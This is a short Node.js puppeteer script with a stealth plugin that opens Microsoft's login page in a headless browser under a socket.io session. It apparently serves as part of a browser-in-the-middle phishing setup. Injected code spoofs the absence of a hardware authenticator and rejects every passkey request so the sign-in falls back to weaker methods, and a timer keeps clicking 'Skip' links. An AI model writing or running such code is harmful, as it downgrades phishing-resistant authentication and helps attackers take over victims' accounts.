const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');

puppeteer.use(StealthPlugin());

async function startSession(io, socket) {
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: ['--no-sandbox', '--disable-setuid-sandbox']
        });

        const page = await browser.newPage();
        
        /**
         * 2026 PASSKEY KILLER:
         * This script runs inside the browser and prevents the Passkey popup
         * from ever hanging the process. It rejects the hardware request.
         */
        await page.evaluateOnNewDocument(() => {
            if (window.PublicKeyCredential) {
                // Force the browser to say "Hardware not available" immediately
                window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable = () => Promise.resolve(false);
                
                // Intercept the passkey creation/login call and reject it
                const oldGet = window.navigator.credentials.get;
                window.navigator.credentials.get = function(options) {
                    if (options.publicKey) {
                        console.log("PASSKEY_BLOCKED: Forcing fallback UI.");
                        return Promise.reject(new DOMException("User cancelled", "NotAllowedError"));
                    }
                    return oldGet.call(this, options);
                };
            }
        });

        await page.setViewport({ width: 1280, height: 720 });
        
        // Navigation & Stream Logic...
        page.goto('https://login.microsoftonline.com/').catch(() => {});

        // Add this specific auto-clicker for the "Skip" link
        const bypass = setInterval(async () => {
            try {
                // Microsoft's 2026 internal ID for the "Skip for now" link
                const skip = await page.$('#iShowSkip, #idBtn_Back, .skip-link');
                if (skip) {
                    console.log("[AUTO] Found skip/cancel, forcing click.");
                    await skip.click();
                }
            } catch (e) {}
        }, 2000);

        socket.on('disconnect', () => {
            clearInterval(bypass);
            browser.close();
        });

    } catch (e) { console.error(e); }
}
